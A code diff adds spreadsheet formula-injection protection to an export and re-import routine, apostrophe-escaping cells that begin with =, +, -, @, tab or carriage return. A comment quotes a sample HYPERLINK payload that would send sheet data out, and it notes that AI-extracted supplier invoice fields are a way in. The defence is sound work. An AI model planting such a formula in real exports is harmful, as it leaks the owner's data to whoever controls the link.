@@ -111,9 +111,23 @@ class ListSpec:
         """Undo the export's human decoration on the way back in."""
         out = dict(rec)
         for f in self.fields:
-            if f.from_cell and f.key in out and isinstance(out[f.key], str):
-                out[f.key] = f.from_cell(out[f.key])
+            v = out.get(f.key)
+            # The apostrophe `_plain` adds to neutralise a formula. Stripped
+            # here so a round trip is lossless: export, re-import, and the
+            # value is what it started as rather than gaining a quote mark
+            # every time it makes the journey.
+            if isinstance(v, str) and v[:1] == "'" and v[1:2] in _FORMULA_START:
+                v = v[1:]
+                out[f.key] = v
+            if f.from_cell and isinstance(v, str):
+                out[f.key] = f.from_cell(v)
         return out
+
+
+#: Characters that make Excel and Sheets treat a cell as a FORMULA rather than
+#: as text. A tab or carriage return counts because the app strips leading
+#: whitespace before deciding.
+_FORMULA_START = ("=", "+", "-", "@", chr(9), chr(13))
 
 
 def _plain(v: Any) -> Any:
@@ -125,6 +139,24 @@ def _plain(v: Any) -> Any:
         # "yes"/"" reads better than True/False to a person, and `yes_no_back`
         # is the matching reader.
         return "yes" if v else ""
+    if isinstance(v, str) and v[:1] in _FORMULA_START:
+        # FORMULA INJECTION, and it is not theoretical here.
+        #
+        # openpyxl types a cell starting "=" as `data_type='f'` — a LIVE
+        # FORMULA in the workbook, not text — and Excel evaluates a CSV cell
+        # the same way, quotes or no quotes. So `=HYPERLINK("http://…"&A2)` in
+        # a vendor name exfiltrates the sheet when the owner opens the file.
+        #
+        # And vendor names are not all typed by trusted staff: `assistant/
+        # ingest.py` creates vendors from fields the AI extracted out of an
+        # UPLOADED SUPPLIER DOCUMENT. A supplier who sends a crafted invoice
+        # can plant the formula; it detonates on the owner's desktop, in the
+        # very export this feature exists to produce.
+        #
+        # A leading apostrophe is Excel's own text escape. `ListSpec.clean()`
+        # takes it back off on re-import — the same "decoration must come back
+        # off" rule as the chosen-supplier star.
+        return "'" + v
     return v
 
 
